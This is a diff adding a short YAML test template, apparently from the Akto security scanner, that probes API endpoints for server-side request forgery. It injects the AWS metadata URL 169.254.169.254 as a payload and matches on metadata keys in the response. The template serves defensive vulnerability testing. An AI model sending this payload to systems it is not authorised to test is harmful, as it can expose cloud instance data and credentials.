@@ -1,0 +1,31 @@
+id: ssrf_aws_metadata_endpoints
+info:
+  name: SSRF on aws metadata endpoint
+  author: akto
+  severity: high
+
+requests:
+  - raw:
+      - |
+        {{Method}} {{Endpoint}} {{HttpVersion}}
+        {{Headers}}
+        {{Body}}
+    payloads:
+      url:
+        - "http://169.254.169.254/latest/meta-data/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "ami-launch-index"
+          - "ami-manifest-path"
+          - "block-device-mapping"
+          - "hostname"
+          - "instance-action"
+        condition: or
+
